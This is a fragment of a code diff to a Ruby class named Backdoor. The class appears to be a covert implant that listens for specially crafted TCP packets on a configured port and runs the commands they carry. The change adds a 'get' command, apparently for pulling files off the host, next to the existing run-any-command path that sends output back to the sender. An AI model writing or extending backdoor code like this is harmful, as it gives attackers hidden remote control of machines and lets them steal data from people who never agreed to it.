@@ -46,7 +46,12 @@ class Backdoor
         # Run Generic Command
         if packet.tcp_dst == @conf_array[2].to_i
             if packet.tcp_flags.fin == 1 then
-                send_data(run_command(@command), packet)
+                cmd = @command.split(' ')
+                if cmd[0] == "get" then
+                    send_data(get_command(cmd[1]), packet)
+                else
+                    send_data(run_command(@command), packet)
+                end
                 @command = ""
             else
                 if @command.nil? then
